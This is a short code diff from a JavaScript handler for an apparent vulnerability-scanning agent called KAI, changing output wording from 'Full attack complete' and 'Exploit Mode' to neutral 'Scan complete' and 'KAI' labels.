-  return { text: 'Full attack complete. Review findings.', steps: 10, trace };
+  return { text: 'Scan complete. Review findings.', steps: 10, trace };
 }
 
 // ============================================================
@@ -873,7 +858,7 @@ export default async function(req, res) {
       
       return res.json({
         ok: true,
-        agent: '🔥 KAI - Exploit Mode',
+        agent: 'KAI',
         text: result.text,
         vulnerabilities: allFindings,
         summary: {
